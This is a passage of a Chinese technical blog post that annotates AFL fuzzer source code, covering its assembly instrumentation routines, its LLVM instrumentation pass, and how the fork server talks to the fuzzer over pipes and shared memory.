class="line">  &quot;movl  4(%%esp), %%edx\n&quot;</span><br><span class="line">  &quot;movl  0(%%esp), %%edi\n&quot;</span><br><span class="line">  &quot;leal 16(%%esp), %%esp\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;/* --- END --- */\n&quot;</span><br><span class="line">  &quot;\n&quot;;</span><br></pre></td></tr></table></figure></p><p>其中，<code>movl $0x%08x, %%ecx\n</code> 为将R(x)生成的随机数给ecx作为标识代码段的key。然后调用__afl_maybe_log，调用完之后，把栈上保存的值恢复回去，再把栈恢复。</p><p>main_payload_32:</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br></pre></td><td class="code"><pre><span class="line">static const u8* main_payload_32 = </span><br><span class="line"></span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;/* --- AFL MAIN PAYLOAD (32-BIT) --- */\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;.text\n&quot;</span><br><span class="line">  &quot;.att_syntax\n&quot;</span><br><span class="line">  &quot;.code32\n&quot;</span><br><span class="line">  &quot;.align 8\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">---</span><br><span class="line">//__afl_maybe_log:</span><br><span class="line">  &quot;__afl_maybe_log:\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;  lahf\n&quot;</span><br><span class="line">  &quot;  seto %al\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;  /* Check if SHM region is already mapped. */\n&quot;</span><br><span class="line">---</span><br><span class="line">//判断共享内存是否加载，edx中存储SHM(__afl_area_ptr)</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;  movl  __afl_area_ptr, %edx\n&quot;</span><br><span class="line">  &quot;  testl %edx, %edx\n&quot;</span><br><span class="line">  &quot;  je    __afl_setup\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">---</span><br><span class="line">//__afl_store:</span><br><span class="line">  &quot;__afl_store:\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;  /* Calculate and store hit for the code location specified in ecx. There\n&quot;</span><br><span class="line">  &quot;     is a double-XOR way of doing this without tainting another register,\n&quot;</span><br><span class="line">  &quot;     and we use it on 64-bit systems; but it&apos;s slower for 32-bit ones. */\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">---</span><br><span class="line">//将pre和当前代码块的key进行异或，结果存储到edi</span><br><span class="line">#ifndef COVERAGE_ONLY</span><br><span class="line">  &quot;  movl __afl_prev_loc, %edi\n&quot;</span><br><span class="line">  &quot;  xorl %ecx, %edi\n&quot;</span><br><span class="line">  &quot;  shrl $1, %ecx\n&quot;</span><br><span class="line">  &quot;  movl %ecx, __afl_prev_loc\n&quot;</span><br><span class="line">#else</span><br><span class="line">  &quot;  movl %ecx, %edi\n&quot;</span><br><span class="line">#endif /* ^!COVERAGE_ONLY */</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">---</span><br><span class="line">//内存映射：edi为索引，edx为map，体现edge命中逻辑</span><br><span class="line">#ifdef SKIP_COUNTS</span><br><span class="line">  &quot;  orb  $1, (%edx, %edi, 1)\n&quot;</span><br><span class="line">#else</span><br><span class="line">  &quot;  incb (%edx, %edi, 1)\n&quot;</span><br><span class="line">#endif /* ^SKIP_COUNTS */</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">---</span><br><span class="line">//__afl_return</span><br><span class="line">  &quot;__afl_return:\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;  addb $127, %al\n&quot;</span><br><span class="line">  &quot;  sahf\n&quot;</span><br><span class="line">  &quot;  ret\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;.align 8\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">---</span><br><span class="line">//__afl_setup </span><br><span class="line">  &quot;__afl_setup:\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;  /* Do not retry setup if we had previous failures. */\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;  cmpb $0, __afl_setup_failure\n&quot;</span><br><span class="line">  &quot;  jne  __afl_return\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;  /* Map SHM, jumping to __afl_setup_abort if something goes wrong.\n&quot;</span><br><span class="line">  &quot;     We do not save FPU/MMX/SSE registers here, but hopefully, nobody\n&quot;</span><br><span class="line">  &quot;     will notice this early in the game. */\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">---</span><br><span class="line">//寻找 SHM 共享内存</span><br><span class="line">  &quot;  pushl %eax\n&quot;</span><br><span class="line">  &quot;  pushl %ecx\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;  pushl $.AFL_SHM_ENV\n&quot;</span><br><span class="line">  &quot;  call  getenv\n&quot;</span><br><span class="line">  &quot;  addl  $4, %esp\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;  testl %eax, %eax\n&quot;</span><br><span class="line">  &quot;  je    __afl_setup_abort\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;  pushl %eax\n&quot;</span><br><span class="line">  &quot;  call  atoi\n&quot;</span><br><span class="line">  &quot;  addl  $4, %esp\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">---</span><br><span class="line">//shmat参数:SHM ID = getenv(.AFL_SHM_ENV)</span><br><span class="line">  &quot;  pushl $0          /* shmat flags    */\n&quot;</span><br><span class="line">  &quot;  pushl $0          /* requested addr */\n&quot;</span><br><span class="line">  &quot;  pushl %eax        /* SHM ID         */\n&quot;</span><br><span class="line">  &quot;  call  shmat\n&quot;</span><br><span class="line">  &quot;  addl  $12, %esp\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;  cmpl $-1, %eax\n&quot;</span><br><span class="line">  &quot;  je   __afl_setup_abort\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">---</span><br><span class="line">//储存 SHM 地址到 __afl_area_ptr</span><br><span class="line">  &quot;  /* Store the address of the SHM region. */\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;  movl %eax, __afl_area_ptr\n&quot;</span><br><span class="line">  &quot;  movl %eax, %edx\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;  popl %ecx\n&quot;</span><br><span class="line">  &quot;  popl %eax\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">---</span><br><span class="line">//__afl_forkserver</span><br><span class="line">  &quot;__afl_forkserver:\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;  /* Enter the fork server mode to avoid the overhead of execve() calls. */\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;  pushl %eax\n&quot;</span><br><span class="line">  &quot;  pushl %ecx\n&quot;</span><br><span class="line">  &quot;  pushl %edx\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;  /* Phone home and tell the parent that we&apos;re OK. (Note that signals with\n&quot;</span><br><span class="line">  &quot;     no SA_RESTART will mess it up). If this fails, assume that the fd is\n&quot;</span><br><span class="line">  &quot;     closed because we were execve()d from an instrumented binary, or because\n&quot; </span><br><span class="line">  &quot;     the parent doesn&apos;t want to use the fork server. */\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">//将__afl_temp中的4个字节写到提前开好的管道中</span><br><span class="line">  &quot;  pushl $4          /* length    */\n&quot;</span><br><span class="line">  &quot;  pushl $__afl_temp /* data      */\n&quot;</span><br><span class="line">  &quot;  pushl $&quot; STRINGIFY((FORKSRV_FD + 1)) &quot;  /* file desc */\n&quot;</span><br><span class="line">  &quot;  call  write\n&quot;</span><br><span class="line">  &quot;  addl  $12, %esp\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;  cmpl  $4, %eax\n&quot;</span><br><span class="line">//jne：不相等跳转，即fail跳转-&gt;__afl_fork_resume</span><br><span class="line">  &quot;  jne   __afl_fork_resume\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">---</span><br><span class="line">//__afl_fork_wait_loop:</span><br><span class="line">  &quot;__afl_fork_wait_loop:\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;  /* Wait for parent by reading from the pipe. Abort if read fails. */\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">//不断地从管道中读取内容，假如读取到的字节数不为4就会跳到__afl_die</span><br><span class="line">  &quot;  pushl $4          /* length    */\n&quot;</span><br><span class="line">  &quot;  pushl $__afl_temp /* data      */\n&quot;</span><br><span class="line">  &quot;  pushl $&quot; STRINGIFY(FORKSRV_FD) &quot;        /* file desc */\n&quot;</span><br><span class="line">  &quot;  call  read\n&quot;</span><br><span class="line">  &quot;  addl  $12, %esp\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;  cmpl  $4, %eax\n&quot;</span><br><span class="line">  &quot;  jne   __afl_die\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;  /* Once woken up, create a clone of our process. This is an excellent use\n&quot;</span><br><span class="line">  &quot;     case for syscall(__NR_clone, 0, CLONE_PARENT), but glibc boneheadedly\n&quot;</span><br><span class="line">  &quot;     caches getpid() results and offers no way to update the value, breaking\n&quot;</span><br><span class="line">  &quot;     abort(), raise(), and a bunch of other things :-( */\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">//fork，判断fork是否成功，如果成功，子进程跳到__afl_fork_resume</span><br><span class="line">  &quot;  call fork\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;  cmpl $0, %eax\n&quot;</span><br><span class="line">  &quot;  jl   __afl_die\n&quot;</span><br><span class="line">  &quot;  je   __afl_fork_resume\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">//父进程 write PID to pipe，传给 fuzzer</span><br><span class="line">  &quot;  /* In parent process: write PID to pipe, then wait for child. */\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;  movl  %eax, __afl_fork_pid\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;  pushl $4              /* length    */\n&quot;</span><br><span class="line">  &quot;  pushl $__afl_fork_pid /* data      */\n&quot;</span><br><span class="line">  &quot;  pushl $&quot; STRINGIFY((FORKSRV_FD + 1)) &quot;      /* file desc */\n&quot;</span><br><span class="line">  &quot;  call  write\n&quot;</span><br><span class="line">  &quot;  addl  $12, %esp\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">//如果waitpid返回的结果小于等于0，就会跳到afl_die，同时状态传入__afl_temp</span><br><span class="line">  &quot;  pushl $0             /* no flags  */\n&quot;</span><br><span class="line">  &quot;  pushl $__afl_temp    /* status    */\n&quot;</span><br><span class="line">  &quot;  pushl __afl_fork_pid /* PID       */\n&quot;</span><br><span class="line">  &quot;  call  waitpid\n&quot;</span><br><span class="line">  &quot;  addl  $12, %esp\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;  cmpl  $0, %eax\n&quot;</span><br><span class="line">  &quot;  jle   __afl_die\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;  /* Relay wait status to pipe, then loop back. */\n&quot;</span><br><span class="line">//状态通过管道传回fuzzer，同时启动新一轮等待</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;  pushl $4          /* length    */\n&quot;</span><br><span class="line">  &quot;  pushl $__afl_temp /* data      */\n&quot;</span><br><span class="line">  &quot;  pushl $&quot; STRINGIFY((FORKSRV_FD + 1)) &quot;  /* file desc */\n&quot;</span><br><span class="line">  &quot;  call  write\n&quot;</span><br><span class="line">  &quot;  addl  $12, %esp\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;  jmp __afl_fork_wait_loop\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">---</span><br><span class="line">//__afl_fork_resume：</span><br><span class="line">  &quot;__afl_fork_resume:\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">//管道关闭，寄存器恢复</span><br><span class="line">  &quot;  /* In child process: close fds, resume execution. */\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;  pushl $&quot; STRINGIFY(FORKSRV_FD) &quot;\n&quot;</span><br><span class="line">  &quot;  call  close\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;  pushl $&quot; STRINGIFY((FORKSRV_FD + 1)) &quot;\n&quot;</span><br><span class="line">  &quot;  call  close\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;  addl  $8, %esp\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;  popl %edx\n&quot;</span><br><span class="line">  &quot;  popl %ecx\n&quot;</span><br><span class="line">  &quot;  popl %eax\n&quot;</span><br><span class="line">//跳转到__afl_store：</span><br><span class="line">  &quot;  jmp  __afl_store\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;__afl_die:\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;  xorl %eax, %eax\n&quot;</span><br><span class="line">  &quot;  call _exit\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;__afl_setup_abort:\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;  /* Record setup failure so that we don&apos;t keep calling\n&quot;</span><br><span class="line">  &quot;     shmget() / shmat() over and over again. */\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;  incb __afl_setup_failure\n&quot;</span><br><span class="line">  &quot;  popl %ecx\n&quot;</span><br><span class="line">  &quot;  popl %eax\n&quot;</span><br><span class="line">  &quot;  jmp __afl_return\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;.AFL_VARS:\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;  .comm   __afl_area_ptr, 4, 32\n&quot;</span><br><span class="line">  &quot;  .comm   __afl_setup_failure, 1, 32\n&quot;</span><br><span class="line">#ifndef COVERAGE_ONLY</span><br><span class="line">  &quot;  .comm   __afl_prev_loc, 4, 32\n&quot;</span><br><span class="line">#endif /* !COVERAGE_ONLY */</span><br><span class="line">  &quot;  .comm   __afl_fork_pid, 4, 32\n&quot;</span><br><span class="line">  &quot;  .comm   __afl_temp, 4, 32\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;.AFL_SHM_ENV:\n&quot;</span><br><span class="line">  &quot;  .asciz \&quot;&quot; SHM_ENV_VAR &quot;\&quot;\n&quot;</span><br><span class="line">  &quot;\n&quot;</span><br><span class="line">  &quot;/* --- END --- */\n&quot;</span><br><span class="line">  &quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">/* The OpenBSD hack is due to lahf and sahf not being recognized by some</span><br><span class="line">   versions of binutils: http://marc.info/?l=openbsd-cvs&amp;m=141636589924400</span><br><span class="line"></span><br><span class="line">   The Apple code is a bit different when calling libc functions because</span><br><span class="line">   they are doing relocations differently from everybody else. We also need</span><br><span class="line">   to work around the crash issue with .lcomm and the fact that they don&apos;t</span><br><span class="line">   recognize .string. */</span><br><span class="line"></span><br><span class="line">#ifdef __APPLE__</span><br><span class="line">#  define CALL_L64(str)&quot;call _&quot; str &quot;\n&quot;</span><br><span class="line">#else</span><br><span class="line">#  define CALL_L64(str)&quot;call &quot; str &quot;@PLT\n&quot;</span><br><span class="line">#endif /* ^__APPLE__ */</span><br></pre></td></tr></table></figure><p>特别的，对于llvm模式，代码插桩仅需一个modulepass，对每个 BB 进行 IRB 的辅助插桩即可<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">for (auto &amp;F : M)</span><br><span class="line">  for (auto &amp;BB : F) &#123;</span><br><span class="line"></span><br><span class="line">    BasicBlock::iterator IP = BB.getFirstInsertionPt();</span><br><span class="line">    IRBuilder&lt;&gt; IRB(&amp;(*IP));</span><br><span class="line"></span><br><span class="line">    if (AFL_R(100) &gt;= inst_ratio) continue;</span><br><span class="line"></span><br><span class="line">    /* Make up cur_loc */</span><br><span class="line"></span><br><span class="line">    unsigned int cur_loc = AFL_R(MAP_SIZE);</span><br><span class="line"></span><br><span class="line">    ConstantInt *CurLoc = ConstantInt::get(Int32Ty, cur_loc);</span><br><span class="line"></span><br><span class="line">    /* Load prev_loc */</span><br><span class="line"></span><br><span class="line">    LoadInst *PrevLoc = IRB.CreateLoad(AFLPrevLoc);</span><br><span class="line">    PrevLoc-&gt;setMetadata(M.getMDKindID(&quot;nosanitize&quot;), MDNode::get(C, None));</span><br><span class="line">    Value *PrevLocCasted = IRB.CreateZExt(PrevLoc, IRB.getInt32Ty());</span><br><span class="line"></span><br><span class="line">    /* Load SHM pointer */</span><br><span class="line">    //shared memory table</span><br><span class="line"></span><br><span class="line">    LoadInst *MapPtr = IRB.CreateLoad(AFLMapPtr);</span><br><span class="line">    MapPtr-&gt;setMetadata(M.getMDKindID(&quot;nosanitize&quot;), MDNode::get(C, None));</span><br><span class="line">    Value *MapPtrIdx =</span><br><span class="line">        IRB.CreateGEP(MapPtr, IRB.CreateXor(PrevLocCasted, CurLoc));</span><br><span class="line"></span><br><span class="line">    /* Update bitmap */</span><br><span class="line"></span><br><span class="line">    LoadInst *Counter = IRB.CreateLoad(MapPtrIdx);</span><br><span class="line">    Counter-&gt;setMetadata(M.getMDKindID(&quot;nosanitize&quot;), MDNode::get(C, None));</span><br><span class="line">    Value *Incr = IRB.CreateAdd(Counter, ConstantInt::get(Int8Ty, 1));</span><br><span class="line">    IRB.CreateStore(Incr, MapPtrIdx)</span><br><span class="line">        -&gt;setMetadata(M.getMDKindID(&quot;nosanitize&quot;), MDNode::get(C, None));</span><br><span class="line"></span><br><span class="line">    /* Set prev_loc to cur_loc &gt;&gt; 1 */</span><br><span class="line"></span><br><span class="line">    StoreInst *Store =</span><br><span class="line">        IRB.CreateStore(ConstantInt::get(Int32Ty, cur_loc &gt;&gt; 1), AFLPrevLoc);</span><br><span class="line">    Store-&gt;setMetadata(M.getMDKindID(&quot;nosanitize&quot;), MDNode::get(C, None));</span><br><span class="line"></span><br><span class="line">    inst_blocks++;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>现在在回到fuzz侧，还记得forksrv的wait状态吗？fuzzer对于wait状态的解除是通过进行用例测试，在fork server启动完成后，一旦需要执行某个测试用例，则fuzzer会调用run_target()方法，在此方法中，便是通过命令管道，通知fork_server准备fork；并通过状态管道，获取子进程pid：<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">if ((res = write(fsrv_ctl_fd, &amp;prev_timed_out, 4)) != 4) &#123;</span><br><span class="line"></span><br><span class="line">  if (stop_soon) return 0;</span><br><span class="line">  RPFATAL(res, &quot;Unable to request new process from fork server (OOM?)&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ((res = read(fsrv_st_fd, &amp;child_pid, 4)) != 4) &#123;</span><br><span class="line"></span><br><span class="line">  if (stop_soon) return 0;</span><br><span class="line">  RPFATAL(res, &quot;Unable to request new process from fork server (OOM?)&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (child_pid &lt;= 0) FATAL(&quot;Fork server is misbehaving (OOM?)&quot;);</span><br></pre></td></tr></table></figure></p><p>随后，fuzzer再次读取状态管道，获取子进程退出状态，并由此来判断子进程结束的原因，例如正常退出、超时、崩溃等，并进行相应的记录。<br><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">    if ((res = read(fsrv_st_fd, &amp;status, 4)) != 4) &#123;</span><br><span class="line">...</span><br><span class="line">  /* Report outcome to caller. */</span><br><span class="line"></span><br><span class="line">  if (WIFSIGNALED(status) &amp;&amp; !stop_soon) &#123;</span><br><span class="line"></span><br><span class="line">    kill_signal = WTERMSIG(status);</span><br><span class="line"></span><br><span class="line">    if (child_timed_out &amp;&amp; kill_signal == SIGKILL) return FAULT_TMOUT;</span><br><span class="line"></span><br><span class="line">    return FAULT_CRASH;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><h3><span id="fork-server结合上述源码">Fork Server（结合上述源码）</span></h3><ul><li><p>【afl-fuzz.cc:!forksrv_pid】fuzzer进程执行fork()得到fork server进程，然后重定向两个管道作为通信接口，并关闭不必要的管道。其中设置了 SAN。然后执行 target。此为forksrv_init</p>   <figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">   if (!forksrv_pid) &#123;</span><br><span class="line">...</span><br><span class="line">    if (dup2(ctl_pipe[0], FORKSRV_FD) &lt; 0) PFATAL(&quot;dup2() failed&quot;);</span><br><span class="line">    if (dup2(st_pipe[1], FORKSRV_FD + 1) &lt; 0) PFATAL(&quot;dup2() failed&quot;);</span><br><span class="line">...</span><br><span class="line">    close(ctl_pipe[0]);</span><br><span class="line">    close(ctl_pipe[1]);</span><br><span class="line">    close(st_pipe[0]);</span><br><span class="line">    close(st_pipe[1]);</span><br><span class="line">...</span><br><span class="line">    setenv(&quot;ASAN_OPTIONS&quot;, &quot;abort_on_error=1:&quot;</span><br><span class="line">                       &quot;detect_leaks=0:&quot;</span><br><span class="line">                       &quot;symbolize=0:&quot;</span><br><span class="line">                       &quot;allocator_may_return_null=1&quot;, 0);</span><br><span class="line">...</span><br><span class="line">    execv(target_path, argv);</span><br></pre></td></tr></table></figure></li><li><p>对于父进程（fuzzer），则会读取状态管道的信息，如果一切正常，则说明fork server创建完成。</p>   